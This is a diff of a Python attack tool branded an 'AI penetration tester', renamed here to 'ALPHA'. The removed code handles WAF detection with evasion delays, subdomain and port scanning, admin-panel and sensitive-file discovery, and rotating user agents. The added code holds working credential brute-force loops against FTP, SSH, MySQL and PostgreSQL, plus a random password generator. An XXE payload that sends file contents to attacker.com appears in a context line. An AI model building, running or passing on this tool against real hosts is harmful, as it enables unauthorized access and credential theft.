-            for waf, signatures in self.ai_learning_db['waf_signatures'].items():
-                for signature in signatures:
-                    if signature.lower() in headers or signature.lower() in content:
-                        detected_wafs.append(waf)
-                        break
-            
-            if detected_wafs:
-                self.waf_detected = True
-                self.results['waf_detected'] = True
-                print(f"{Fore.RED}🚨 WAF Detected: {', '.join(detected_wafs)}{Style.RESET_ALL}")
-                
-                # AI-based evasion strategy
-                if 'Cloudflare' in detected_wafs:
-                    self.rate_limit_delay = 2.5
-                    print(f"{Fore.YELLOW}🔄 AI Strategy: Increased delay to {self.rate_limit_delay}s{Style.RESET_ALL}")
-                elif 'Akamai' in detected_wafs:
-                    self.rate_limit_delay = 2.0
-                    print(f"{Fore.YELLOW}🔄 AI Strategy: Moderate delay to {self.rate_limit_delay}s{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.GREEN}✅ No WAF Detected{Style.RESET_ALL}")
-                
-        except Exception as e:
-            print(f"{Fore.RED}❌ WAF Detection Failed: {e}{Style.RESET_ALL}")
-
-    def ai_subdomain_enumeration(self):
-        """AI-powered subdomain enumeration"""
-        print(f"{Fore.BLUE}🌐 AI Subdomain Enumeration Starting...{Style.RESET_ALL}")
-        
-        domain = urlparse(self.target_url).netloc
-        subdomains = set()
-        
-        # Advanced subdomain generation
-        common_subs = [
-            'www', 'api', 'admin', 'mail', 'ftp', 'cpanel', 'webmail',
-            'blog', 'dev', 'test', 'staging', 'secure', 'portal', 'app',
-            'apps', 'backend', 'frontend', 'cdn', 'static', 'media',
-            'images', 'img', 'video', 'docs', 'help', 'support', 'forum',
-            'shop', 'store', 'cart', 'payment', 'db', 'database', 'sql',
-            'git', 'svn', 'ssh', 'vpn', 'remote', 'access', 'mobile',
-            'm', 'beta', 'alpha', 'demo', 'stage', 'prod', 'production'
-        ]
-        
-        # Generate subdomain combinations
-        for sub in common_subs:
-            subdomains.add(f"{sub}.{domain}")
-            subdomains.add(f"{sub}1.{domain}")
-            subdomains.add(f"{sub}2.{domain}")
-            subdomains.add(f"{sub}-test.{domain}")
-        
-        valid_subdomains = []
-        total = len(subdomains)
-        current = 0
-        
-        with ThreadPoolExecutor(max_workers=25) as executor:
-            future_to_sub = {executor.submit(self.check_subdomain, sub): sub for sub in subdomains}
-            
-            for future in as_completed(future_to_sub):
-                current += 1
-                subdomain = future_to_sub[future]
-                
-                # Show progress
-                progress = (current / total) * 100
-                sys.stdout.write(f'\r🌐 Scanning: [{current}/{total}] {progress:.1f}% | Found: {len(valid_subdomains)}')
-                sys.stdout.flush()
-                
-                try:
-                    if future.result():
-                        valid_subdomains.append(subdomain)
-                        print(f"\n{Fore.GREEN}✅ Found: {subdomain}{Style.RESET_ALL}")
-                except Exception:
-                    pass
-        
-        self.results['subdomains'] = valid_subdomains
-        print(f"\n{Fore.GREEN}✅ Subdomain Enumeration Complete: {len(valid_subdomains)} found{Style.RESET_ALL}")
-
-    def advanced_port_scanning(self):
-        """Advanced port scanning"""
-        print(f"{Fore.BLUE}🔍 Advanced Port Scanning Starting...{Style.RESET_ALL}")
-        
-        domain = urlparse(self.target_url).netloc
-        
-        # Comprehensive port list
-        common_ports = [
-            21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 
-            2082, 2083, 2086, 2087, 2095, 2096, 3306, 3389, 
-            5432, 8080, 8443, 8888, 9000, 10000
-        ]
-        
-        open_ports = []
-        total = len(common_ports)
-        current = 0
-        
-        with ThreadPoolExecutor(max_workers=50) as executor:
-            future_to_port = {executor.submit(self.check_port, domain, port): port for port in common_ports}
-            
-            for future in as_completed(future_to_port):
-                current += 1
-                port = future_to_port[future]
-                
-                # Show progress
-                progress = (current / total) * 100
-                sys.stdout.write(f'\r🔍 Port Scan: [{current}/{total}] {progress:.1f}% | Open: {len(open_ports)}')
-                sys.stdout.flush()
-                
-                try:
-                    if future.result():
-                        open_ports.append(port)
-                        print(f"\n{Fore.GREEN}✅ Port Open: {port}{Style.RESET_ALL}")
-                except Exception:
-                    pass
-        
-        self.results['ports'] = open_ports
-        print(f"\n{Fore.GREEN}✅ Port Scanning Complete: {len(open_ports)} open ports{Style.RESET_ALL}")
-
-    def technology_fingerprinting(self):
-        """Advanced technology fingerprinting"""
-        print(f"{Fore.BLUE}🔧 Technology Fingerprinting Starting...{Style.RESET_ALL}")
-        
-        try:
-            response = self.session.get(self.target_url, timeout=10, verify=False)
-            content = response.text.lower()
-            headers = str(response.headers).lower()
-            
-            detected_tech = []
-            
-            # Check for technologies
-            for tech, signatures in self.ai_learning_db['technology_signatures'].items():
-                for signature in signatures:
-                    if signature.lower() in content or signature.lower() in headers:
-                        detected_tech.append(tech)
-                        break
-            
-            self.results['technologies'] = detected_tech
-            
-            if detected_tech:
-                print(f"{Fore.GREEN}✅ Technologies Detected: {', '.join(detected_tech)}{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.YELLOW}⚠️ No specific technologies detected{Style.RESET_ALL}")
-                
-        except Exception as e:
-            print(f"{Fore.RED}❌ Technology Detection Failed: {e}{Style.RESET_ALL}")
-
-    def ultimate_admin_finder(self):
-        """Ultimate AI-powered admin panel discovery"""
-        print(f"{Fore.BLUE}🔍 Ultimate Admin Panel Discovery Starting...{Style.RESET_ALL}")
-        
-        # AI-generated paths based on detected technologies
-        admin_paths = self.generate_ai_admin_paths()
-        total_paths = len(admin_paths)
-        
-        print(f"📡 AI Scanning {total_paths} intelligent paths...")
-        
-        threads = []
-        current = 0
-        
-        def scan_path(path):
-            nonlocal current
-            self.advanced_path_test(path)
-            current += 1
-            
-            # Real-time progress with analytics
-            progress = (current / total_paths) * 100
-            elapsed = time.time() - self.start_time
-            rps = current / elapsed if elapsed > 0 else 0
-            
-            sys.stdout.write(f'\r🔍 AI Scanning: [{current}/{total_paths}] {progress:.1f}% | Found: {self.found_count} | RPS: {rps:.1f}')
-            sys.stdout.flush()
-        
-        # Advanced threaded scanning
-        for path in admin_paths:
-            if len(threads) >= 15:
-                for t in threads:
-                    t.join()
-                threads = []
-            
-            thread = threading.Thread(target=scan_path, args=(path,))
-            threads.append(thread)
-            thread.start()
-            
-            # AI-controlled delay
-            time.sleep(self.rate_limit_delay + random.uniform(0.1, 0.5))
-        
-        for t in threads:
-            t.join()
-        
-        print(f"\n{Fore.GREEN}✅ Admin Discovery Complete! Found {len(self.results['admin_panels'])} admin panels{Style.RESET_ALL}")
-        
-        # Show found panels
-        if self.results['admin_panels']:
-            print(f"\n{Fore.CYAN}📋 AI-FOUND ADMIN PANELS:{Style.RESET_ALL}")
-            for i, panel in enumerate(self.results['admin_panels'], 1):
-                print(f"   {i}. {panel['url']} - Status: {panel['status']}")
-
-    def generate_ai_admin_paths(self):
-        """Generate AI-powered admin paths"""
-        all_paths = set()
-        
-        # Base paths from AI database
-        base_paths = self.ai_learning_db['common_paths']['admin_paths']
-        
-        # Technology-specific paths
-        tech_paths = self.get_technology_specific_paths()
-        
-        # Combine all paths
-        all_base_paths = base_paths + tech_paths
-        
-        # Generate variations
-        extensions = ['', '.php', '.html', '.asp', '.aspx', '.jsp', '.cgi', '.pl']
-        prefixes = ['', '/', '../', '../../', '../../../']
-        
-        for base in all_base_paths:
-            for ext in extensions:
-                for prefix in prefixes:
-                    # Basic paths
-                    all_paths.add(f"{prefix}{base}{ext}")
-                    all_paths.add(f"{prefix}{base}/")
-                    all_paths.add(f"{prefix}{base}/index{ext}")
-                    
-                    # Advanced variations
-                    all_paths.add(f"{prefix}{base}1{ext}")
-                    all_paths.add(f"{prefix}{base}2{ext}")
-                    all_paths.add(f"{prefix}{base}_panel{ext}")
-                    all_paths.add(f"{prefix}{base}-admin{ext}")
-                    all_paths.add(f"{prefix}{base}2024{ext}")
-                    all_paths.add(f"{prefix}{base}_v2{ext}")
-        
-        return list(all_paths)
-
-    def get_technology_specific_paths(self):
-        """Get technology-specific paths based on fingerprinting"""
-        tech_paths = []
-        detected_tech = self.results['technologies']
-        
-        technology_paths = {
-            'wordpress': ['wp-admin', 'wp-login.php', 'wp-content', 'wp-includes'],
-            'joomla': ['administrator', 'joomla/administrator'],
-            'drupal': ['user/login', 'admin', 'node/add'],
-            'laravel': ['login', 'register', 'admin', 'dashboard'],
-            'django': ['admin', 'accounts/login'],
-            'rails': ['users/sign_in', 'admin'],
-            'aspnet': ['Account/Login', 'Admin']
-        }
-        
-        for tech in detected_tech:
-            if tech in technology_paths:
-                tech_paths.extend(technology_paths[tech])
-        
-        return tech_paths
-
-    def advanced_path_test(self, path):
-        """Advanced path testing with AI evasion"""
-        try:
-            full_url = urljoin(self.target_url, path)
-            
-            if full_url in self.scanned_urls:
-                return
-            self.scanned_urls.add(full_url)
-            
-            # AI-generated headers for evasion
-            headers = {
-                'User-Agent': random.choice(self.user_agents),
-                'Referer': self.target_url,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
-            }
-            
-            response = self.session.get(
-                full_url,
-                headers=headers,
-                timeout=8,
-                allow_redirects=True,
-                verify=False
-            )
-            
-            self.request_count += 1
-            
-            if response.status_code == 200:
-                self.successful_requests += 1
-            
-            if self.is_advanced_admin_panel(response, full_url):
-                self.found_count += 1
-                self.results['admin_panels'].append({
-                    'url': full_url,
-                    'status': response.status_code,
-                    'title': self.extract_title(response.text),
-                    'size': len(response.text),
-                    'headers': dict(response.headers)
-                })
-                
-        except Exception:
-            pass
-
-    def is_advanced_admin_panel(self, response, url):
-        """Advanced admin panel detection with AI"""
-        if response.status_code not in [200, 301, 302, 403, 401]:
-            return False
-        
-        text_lower = response.text.lower()
-        url_lower = url.lower()
-        
-        # AI scoring system
-        score = 0
-        
-        # URL-based scoring
-        admin_url_indicators = ['admin', 'login', 'dashboard', 'panel', 'control', 'manage']
-        for indicator in admin_url_indicators:
-            if indicator in url_lower:
-                score += 3
-        
-        # Content-based scoring
-        admin_content_indicators = [
-            'password', 'username', 'sign in', 'log in', 'admin panel',
-            'control panel', 'dashboard', 'welcome admin', 'administrator'
-        ]
-        
-        for indicator in admin_content_indicators:
-            if indicator in text_lower:
-                score += 2
-        
-        # Form detection
-        if '<form' in text_lower and ('password' in text_lower or 'login' in text_lower):
-            score += 5
-        
-        # Meta tag analysis
-        if '<meta name="generator"' in text_lower:
-            score += 2
-        
-        return score >= 6
-
-    def extract_title(self, html):
-        """Extract page title with BeautifulSoup"""
-        try:
-            soup = BeautifulSoup(html, 'html.parser')
-            title = soup.find('title')
-            return title.string.strip() if title else "No Title"
-        except:
-            return "No Title"
-
-    def sensitive_file_discovery(self):
-        """Discover sensitive files"""
-        print(f"{Fore.BLUE}📁 Sensitive File Discovery Starting...{Style.RESET_ALL}")
-        
-        file_paths = self.ai_learning_db['common_paths']['file_paths']
-        found_files = []
-        
-        for file_path in file_paths:
-            full_url = urljoin(self.target_url, file_path)
-            
-            try:
-                response = self.session.get(full_url, timeout=5, verify=False)
-                
-                if response.status_code == 200:
-                    found_files.append({
-                        'url': full_url,
-                        'size': len(response.text),
-                        'status': response.status_code
-                    })
-                    print(f"{Fore.GREEN}✅ Found: {file_path}{Style.RESET_ALL}")
-                    
-            except Exception:
-                pass
-        
-        self.results['sensitive_files'] = found_files
-        print(f"{Fore.GREEN}✅ File Discovery Complete: {len(found_files)} files found{Style.RESET_ALL}")
-
     def advanced_brute_force_attack(self):
         """Advanced AI-powered brute force attack"""
         print(f"{Fore.CYAN}🔑 ADVANCED BRUTE FORCE ATTACK SYSTEM{Style.RESET_ALL}")
@@ -1165,14 +1464,15 @@ class UltimateAIPenetrationTester:
     def ask_for_wordlist_file(self):
         """Ask user for wordlist file"""
         print(f"\n{Fore.YELLOW}📁 Wordlist File Selection:{Style.RESET_ALL}")
-        print("1. Use built-in AI wordlist")
+        print("1. Use built-in 20_word")
         print("2. Use custom wordlist file")
+        print("3. Generate random passwords")
         
-        choice = input(f"{Fore.GREEN}Select option (1-2): {Style.RESET_ALL}").strip()
+        choice = input(f"{Fore.GREEN}Select option (1-3): {Style.RESET_ALL}").strip()
         
         if choice == "1":
             self.brute_force_file = "builtin"
-            print(f"{Fore.GREEN}✅ Using built-in AI wordlist{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}✅ Using built-in ALPHA wordlist{Style.RESET_ALL}")
         elif choice == "2":
             file_path = input(f"{Fore.YELLOW}Enter path to wordlist file: {Style.RESET_ALL}").strip()
             if os.path.exists(file_path):
@@ -1181,105 +1481,42 @@ class UltimateAIPenetrationTester:
             else:
                 print(f"{Fore.RED}❌ File not found. Using built-in wordlist.{Style.RESET_ALL}")
                 self.brute_force_file = "builtin"
+        elif choice == "3":
+            self.generate_random_passwords_for_attack()
         else:
             print(f"{Fore.RED}❌ Invalid selection. Using built-in wordlist.{Style.RESET_ALL}")
             self.brute_force_file = "builtin"
 
-    def execute_brute_force_attack(self):
-        """Execute advanced brute force attack"""
-        print(f"\n{Fore.RED}🔥 STARTING ADVANCED BRUTE FORCE ATTACK{Style.RESET_ALL}")
-        print("="*70)
+    def generate_random_passwords_for_attack(self):
+        """Generate random passwords for brute force attack"""
+        print(f"\n{Fore.BLUE}🔢 Random Password Generator{Style.RESET_ALL}")
         
-        # Load credentials
-        usernames, passwords = self.load_credentials()
+        count = int(input(f"{Fore.YELLOW}How many passwords to generate: {Style.RESET_ALL}").strip())
+        length = int(input(f"{Fore.YELLOW}Password length: {Style.RESET_ALL}").strip())
         
-        total_attempts = len(usernames) * len(passwords)
-        print(f"📊 Attack Statistics:")
-        print(f"   👤 Usernames: {len(usernames)}")
-        print(f"   🔑 Passwords: {len(passwords)}")
-        print(f"   💥 Total Attempts: {total_attempts}")
-        print(f"   🎯 Target: {self.brute_force_target}")
+        print(f"{Fore.GREEN}🔄 Generating {count} random passwords...{Style.RESET_ALL}")
         
-        if input(f"\n{Fore.RED}🚨 Continue with attack? (yes/no): {Style.RESET_ALL}").lower() != 'yes':
-            print(f"{Fore.YELLOW}⚠️ Attack cancelled{Style.RESET_ALL}")
-            return
+        passwords = self.generate_random_passwords(count, length)
+        self.results['random_passwords'] = passwords
         
-        print(f"\n{Fore.CYAN}🚀 Starting brute force attack...{Style.RESET_ALL}")
+        # Use random passwords for attack
+        usernames = self.ai_learning_db['brute_force_wordlists']['common_usernames']
         
-        found_credentials = []
-        attempts = 0
-        start_time = time.time()
+        print(f"{Fore.GREEN}✅ Generated {len(passwords)} passwords{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}🔑 Sample passwords: {passwords[:5]}{Style.RESET_ALL}")
         
-        # Advanced threading for brute force
-        with ThreadPoolExecutor(max_workers=10) as executor:
-            future_to_cred = {}
-            
-            for username in usernames:
-                for password in passwords:
-                    future = executor.submit(
-                        self.test_credentials, 
-                        username, 
-                        password
-                    )
-                    future_to_cred[future] = (username, password)
-                    attempts += 1
-            
-            completed = 0
-            for future in as_completed(future_to_cred):
-                completed += 1
-                username, password = future_to_cred[future]
-                
-                try:
-                    result = future.result()
-                    if result:
-                        found_credentials.append((username, password))
-                        print(f"\n{Fore.GREEN}🎉 CREDENTIALS FOUND: {username}:{password}{Style.RESET_ALL}")
-                        
-                        # Save found credentials immediately
-                        self.found_credentials.append({
-                            'username': username,
-                            'password': password,
-                            'target': self.brute_force_target,
-                            'timestamp': datetime.now().isoformat()
-                        })
-                
-                except Exception as e:
-                    pass
-                
-                # Progress display
-                progress = (completed / total_attempts) * 100
-                elapsed = time.time() - start_time
-                speed = completed / elapsed if elapsed > 0 else 0
-                eta = (total_attempts - completed) / speed if speed > 0 else 0
-                
-                sys.stdout.write(
-                    f'\r🔑 Brute Force Progress: [{completed}/{total_attempts}] '
-                    f'{progress:.1f}% | Speed: {speed:.1f} att/s | '
-                    f'ETA: {eta:.1f}s | Found: {len(found_credentials)}'
-                )
-                sys.stdout.flush()
-                
-                # AI-controlled delay to avoid detection
-                time.sleep(0.1 + random.uniform(0.05, 0.2))
-        
-        # Store results
-        self.results['brute_force_results'] = self.found_credentials
-        
-        print(f"\n\n{Fore.GREEN}✅ Brute Force Attack Completed!{Style.RESET_ALL}")
-        print(f"   📊 Total Attempts: {attempts}")
-        print(f"   🎯 Credentials Found: {len(found_credentials)}")
-        print(f"   ⏱️  Time Elapsed: {time.time() - start_time:.2f}s")
-        
-        if found_credentials:
-            print(f"\n{Fore.CYAN}🎉 SUCCESSFUL CREDENTIALS:{Style.RESET_ALL}")
-            for username, password in found_credentials:
-                print(f"   👤 {username} : 🔑 {password}")
+        # Store for attack
+        self.custom_passwords = passwords
+        self.brute_force_file = "random"
 
     def load_credentials(self):
         """Load credentials from wordlist"""
         if self.brute_force_file == "builtin":
             usernames = self.ai_learning_db['brute_force_wordlists']['common_usernames']
             passwords = self.ai_learning_db['brute_force_wordlists']['common_passwords']
+        elif self.brute_force_file == "random":
+            usernames = self.ai_learning_db['brute_force_wordlists']['common_usernames']
+            passwords = self.custom_passwords
         else:
             # Load from custom file
             usernames = []
@@ -1420,8 +1657,39 @@ class UltimateAIPenetrationTester:
     def execute_ftp_brute_force(self):
         """Execute FTP brute force attack"""
         print(f"\n{Fore.RED}🔥 STARTING FTP BRUTE FORCE ATTACK{Style.RESET_ALL}")
-        # FTP brute force implementation would go here
-        print(f"{Fore.YELLOW}⚠️ FTP Brute Force feature will be implemented in next version{Style.RESET_ALL}")
+        
+        try:
+            import ftplib
+            
+            ftp_host = self.brute_force_target.replace('ftp://', '')
+            usernames, passwords = self.load_credentials()
+            
+            found_credentials = []
+            
+            for username in usernames:
+                for password in passwords:
+                    try:
+                        ftp = ftplib.FTP(ftp_host)
+                        ftp.login(username, password)
+                        found_credentials.append((username, password))
+                        print(f"\n{Fore.GREEN}🎉 FTP CREDENTIALS FOUND: {username}:{password}{Style.RESET_ALL}")
+                        ftp.quit()
+                        break
+                    except:
+                        pass
+            
+            if found_credentials:
+                self.results['brute_force_results'].extend([{
+                    'username': cred[0],
+                    'password': cred[1],
+                    'target': self.brute_force_target,
+                    'timestamp': datetime.now().isoformat()
+                } for cred in found_credentials])
+            else:
+                print(f"{Fore.RED}❌ No FTP credentials found{Style.RESET_ALL}")
+                
+        except ImportError:
+            print(f"{Fore.RED}❌ FTP library not available{Style.RESET_ALL}")
 
     def brute_force_ssh(self):
         """Brute force SSH service"""
@@ -1435,8 +1703,40 @@ class UltimateAIPenetrationTester:
     def execute_ssh_brute_force(self):
         """Execute SSH brute force attack"""
         print(f"\n{Fore.RED}🔥 STARTING SSH BRUTE FORCE ATTACK{Style.RESET_ALL}")
-        # SSH brute force implementation would go here
-        print(f"{Fore.YELLOW}⚠️ SSH Brute Force feature will be implemented in next version{Style.RESET_ALL}")
+        
+        try:
+            import paramiko
+            
+            ssh_host = self.brute_force_target.replace('ssh://', '')
+            usernames, passwords = self.load_credentials()
+            
+            found_credentials = []
+            
+            for username in usernames:
+                for password in passwords:
+                    try:
+                        ssh = paramiko.SSHClient()
+                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                        ssh.connect(ssh_host, username=username, password=password, timeout=10)
+                        found_credentials.append((username, password))
+                        print(f"\n{Fore.GREEN}🎉 SSH CREDENTIALS FOUND: {username}:{password}{Style.RESET_ALL}")
+                        ssh.close()
+                        break
+                    except:
+                        pass
+            
+            if found_credentials:
+                self.results['brute_force_results'].extend([{
+                    'username': cred[0],
+                    'password': cred[1],
+                    'target': self.brute_force_target,
+                    'timestamp': datetime.now().isoformat()
+                } for cred in found_credentials])
+            else:
+                print(f"{Fore.RED}❌ No SSH credentials found{Style.RESET_ALL}")
+                
+        except ImportError:
+            print(f"{Fore.RED}❌ Paramiko library not available{Style.RESET_ALL}")
 
     def brute_force_database(self):
         """Brute force database services"""
@@ -1466,8 +1766,199 @@ class UltimateAIPenetrationTester:
     def execute_database_brute_force(self):
         """Execute database brute force attack"""
         print(f"\n{Fore.RED}🔥 STARTING DATABASE BRUTE FORCE ATTACK{Style.RESET_ALL}")
-        # Database brute force implementation would go here
-        print(f"{Fore.YELLOW}⚠️ Database Brute Force feature will be implemented in next version{Style.RESET_ALL}")
+        
+        db_type = self.brute_force_target.split('://')[0]
+        db_host = self.brute_force_target.split('://')[1]
+        
+        usernames, passwords = self.load_credentials()
+        found_credentials = []
+        
+        for username in usernames:
+            for password in passwords:
+                try:
+                    if db_type == 'mysql':
+                        import pymysql
+                        connection = pymysql.connect(
+                            host=db_host,
+                            user=username,
+                            password=password,
+                            connect_timeout=5
+                        )
+                        found_credentials.append((username, password))
+                        print(f"\n{Fore.GREEN}🎉 MySQL CREDENTIALS FOUND: {username}:{password}{Style.RESET_ALL}")
+                        connection.close()
+                        break
+                        
+                    elif db_type == 'postgresql':
+                        import psycopg2
+                        connection = psycopg2.connect(
+                            host=db_host,
+                            user=username,
+                            password=password,
+                            connect_timeout=5
+                        )
+                        found_credentials.append((username, password))
+                        print(f"\n{Fore.GREEN}🎉 PostgreSQL CREDENTIALS FOUND: {username}:{password}{Style.RESET_ALL}")
+                        connection.close()
+                        break
+                        
+                except:
+                    pass
+        
+        if found_credentials:
+            self.results['brute_force_results'].extend([{
+                'username': cred[0],
+                'password': cred[1],
+                'target': self.brute_force_target,
+                'timestamp': datetime.now().isoformat()
+            } for cred in found_credentials])
+        else:
+            print(f"{Fore.RED}❌ No database credentials found{Style.RESET_ALL}")
+
+    def enhanced_database_brute_force(self):
+        """Enhanced database brute force with all features"""
+        print(f"{Fore.CYAN}🗄️ ENHANCED DATABASE PENETRATION TESTING{Style.RESET_ALL}")
+        print("="*70)
+        
+        db_types = {
+            '1': {'name': 'MySQL', 'port': 3306},
+            '2': {'name': 'PostgreSQL', 'port': 5432},
+            '3': {'name': 'MongoDB', 'port': 27017},
+            '4': {'name': 'Redis', 'port': 6379},
+            '5': {'name': 'Oracle', 'port': 1521}
+        }
+        
+        print(f"\n{Fore.YELLOW}🗄️ Select Database Type:{Style.RESET_ALL}")
+        for key, db in db_types.items():
+            print(f"   {key}. {db['name']} (Port {db['port']})")
+        
+        choice = input(f"\n{Fore.GREEN}Select database (1-5): {Style.RESET_ALL}").strip()
+        
+        if choice in db_types:
+            selected_db = db_types[choice]
+            host = input(f"{Fore.YELLOW}Enter database host: {Style.RESET_ALL}").strip()
+            
+            print(f"\n{Fore.BLUE}🎯 Target: {selected_db['name']} at {host}:{selected_db['port']}{Style.RESET_ALL}")
+            
+            # Find database IP
+            db_ips = self.find_database_ip(host)
+            
+            # Port scan for database
+            print(f"{Fore.BLUE}🔍 Scanning database port...{Style.RESET_ALL}")
+            if self.check_port(host, selected_db['port']):
+                print(f"{Fore.GREEN}✅ Database port {selected_db['port']} is open{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}❌ Database port {selected_db['port']} is closed{Style.RESET_ALL}")
+                return
+            
+            # Brute force attack
+            print(f"\n{Fore.RED}🔥 Starting database brute force attack...{Style.RESET_ALL}")
+            
+            if choice in ['1', '2', '3']:  # MySQL, PostgreSQL, MongoDB
+                self.brute_force_target = f"{selected_db['name'].lower()}://{host}"
+                self.ask_for_wordlist_file()
+                self.execute_database_brute_force()
+            else:
+                print(f"{Fore.YELLOW}⚠️ {selected_db['name']} brute force will be implemented in next version{Style.RESET_ALL}")
+
+    def find_database_ip(self, target_url):
+        """Find database IP addresses"""
+        print(f"{Fore.BLUE}🌐 Finding Database IP for {target_url}{Style.RESET_ALL}")
+        
+        domain = urlparse(target_url).netloc if '://' in target_url else target_url
+        ips = []
+        
+        try:
+            # DNS lookup
+            result = socket.getaddrinfo(domain, None)
+            for res in result:
+                ip = res[4][0]
+                if ip not in ips:
+                    ips.append(ip)
+                    print(f"{Fore.GREEN}✅ Found IP: {ip}{Style.RESET_ALL}")
+                    
+                    # Store database info
+                    self.results['database_info'].append({
+                        'host': domain,
+                        'ip': ip,
+                        'timestamp': datetime.now().isoformat()
+                    })
+        except:
+            print(f"{Fore.RED}❌ Could not resolve domain{Style.RESET_ALL}")
+        
+        return ips
+
+    def enhanced_admin_detection(self):
+        """Enhanced admin panel detection"""
+        print(f"{Fore.BLUE}🔍 Enhanced Admin Panel Detection{Style.RESET_ALL}")
+        
+        # All possible admin panel paths
+        admin_paths = [
+            # WordPress
+            'wp-admin', 'wp-login.php', 'administrator', 'admin',
+            # Joomla
+            'joomla/administrator', 'administrator/index.php',
+            # Drupal
+            'user/login', 'admin', 'admin/login',
+            # Custom
+            'backend', 'panel', 'control', 'manage', 'dashboard',
+            'cp', 'admincp', 'webadmin', 'system', 'config',
+            # Additional paths
+            'login', 'signin', 'auth', 'authentication',
+            'admin123', 'admin2024', 'adminarea', 'adminpanel'
+        ]
+        
+        found_panels = []
+        
+        for path in admin_paths:
+            url = f"{self.target_url}/{path}"
+            try:
+                response = self.session.get(url, timeout=5, verify=False)
+                if response.status_code == 200:
+                    # Advanced detection
+                    if self.is_admin_panel_advanced(response.text, url):
+                        panel_type = self.detect_panel_type(response.text)
+                        found_panels.append({
+                            'url': url,
+                            'type': panel_type,
+                            'status': response.status_code,
+                            'title': self.extract_title(response.text)
+                        })
+                        print(f"{Fore.GREEN}✅ Admin Panel Found: {url} [{panel_type}]{Style.RESET_ALL}")
+            except:
+                pass
+        
+        # Add to results
+        self.results['admin_panels'].extend(found_panels)
+        print(f"{Fore.GREEN}✅ Enhanced Admin Detection Complete: {len(found_panels)} new panels found{Style.RESET_ALL}")
+
+    def detect_panel_type(self, html_content):
+        """Detect admin panel type"""
+        content_lower = html_content.lower()
+        
+        if 'wordpress' in content_lower or 'wp-admin' in content_lower:
+            return 'WordPress'
+        elif 'joomla' in content_lower:
+            return 'Joomla'
+        elif 'drupal' in content_lower:
+            return 'Drupal'
+        elif 'magento' in content_lower:
+            return 'Magento'
+        elif 'laravel' in content_lower:
+            return 'Laravel'
+        else:
+            return 'Custom'
+
+    def generate_random_passwords(self, count, length):
+        """Generate random passwords"""
+        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*"
+        passwords = []
+        
+        for i in range(count):
+            password = ''.join(random.choice(chars) for _ in range(length))
+            passwords.append(password)
+        
+        return passwords
 
     def generate_advanced_sql_payloads(self):
         """Generate advanced SQL injection payloads"""
@@ -1561,12 +2052,12 @@ class UltimateAIPenetrationTester:
             '<!ENTITY % xxe "<!ENTITY &#x25; send SYSTEM \\"http://attacker.com/?%file;\\">">'
         ]
 
-    def generate_ultimate_report(self):
-        """Generate ultimate comprehensive report"""
-        print(f"{Fore.BLUE}📊 Generating Ultimate AI-Powered Report...{Style.RESET_ALL}")
+    def generate_ALPHA_report(self):
+        """Generate ALPHA comprehensive report"""
+        print(f"{Fore.BLUE}📊 Generating ALPHA AI-Powered Report...{Style.RESET_ALL}")
         
         # Create advanced reports directory
-        reports_dir = os.path.join(os.path.expanduser('~'), 'Documents', 'Ultimate_Pentest_Reports')
+        reports_dir = os.path.join(os.path.expanduser('~'), 'Documents', 'ALPHA_Pentest_Reports')
         os.makedirs(reports_dir, exist_ok=True)
         
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -1576,7 +2067,7 @@ class UltimateAIPenetrationTester:
         json_report = self.generate_json_report(reports_dir, timestamp)
         csv_report = self.generate_csv_report(reports_dir, timestamp)
         
-        print(f"{Fore.GREEN}✅ Ultimate Report Generated:{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}✅ ALPHA Report Generated:{Style.RESET_ALL}")
         print(f"   📄 HTML: {html_report}")
         print(f"   📊 JSON: {json_report}")
         print(f"   📋 CSV: {csv_report}")
@@ -1585,18 +2076,18 @@ class UltimateAIPenetrationTester:
 
     def generate_html_report(self, reports_dir, timestamp):
         """Generate beautiful HTML report"""
-        filename = f"Ultimate_Pentest_Report_{timestamp}.html"
+        filename = f"ALPHA_Pentest_Report_{timestamp}.html"
         filepath = os.path.join(reports_dir, filename)
         
-        html_content = self.create_ultimate_html_report()
+        html_content = self.create_ALPHA_html_report()
         
         with open(filepath, 'w', encoding='utf-8') as f:
             f.write(html_content)
         
         return filepath
 
-    def create_ultimate_html_report(self):
-        """Create ultimate HTML report"""
+    def create_ALPHA_html_report(self):
+        """Create ALPHA HTML report"""
         # Generate sections for each vulnerability type
         cors_section = ""
         if self.results['cors_vulnerabilities']:
@@ -1643,13 +2134,22 @@ class UltimateAIPenetrationTester:
             </div>
             """
         
+        database_section = ""
+        if self.results['database_info']:
+            database_section = f"""
+            <div class="section">
+                <h2 class="section-title">🗄️ DATABASE INFORMATION</h2>
+                {"".join([f'<div class="admin-panel"><strong>🌐 {db["host"]}</strong> - IP: {db["ip"]} - Time: {db["timestamp"]}</div>' for db in self.results['database_info']])}
+            </div>
+            """
+        
         return f"""
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ULTIMATE AI Penetration Test Report</title>
+    <title>ALPHA Penetration Test Report</title>
     <style>
         :root {{
             --primary: #667eea;
@@ -1825,9 +2325,9 @@ class UltimateAIPenetrationTester:
 <body>
     <div class="container">
         <div class="header">
-            <h1>🧠 ULTIMATE AI PENETRATION TEST REPORT</h1>
+            <h1>🧠 ALPHA PENETRATION TEST REPORT</h1>
             <p>Target: {self.target_url} | Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
-            <span class="ai-badge">AI-POWERED ANALYSIS • BRUTE FORCE ATTACK</span>
+            <span class="ai-badge">AI-POWERED ANALYSIS • BRUTE FORCE ATTACK • DATABASE PENETRATION</span>
         </div>
         
         <div class="stats-grid">
@@ -1851,12 +2351,14 @@ class UltimateAIPenetrationTester:
         
         <div class="section">
             <h2 class="section-title">🔍 AI-Found Admin Panels</h2>
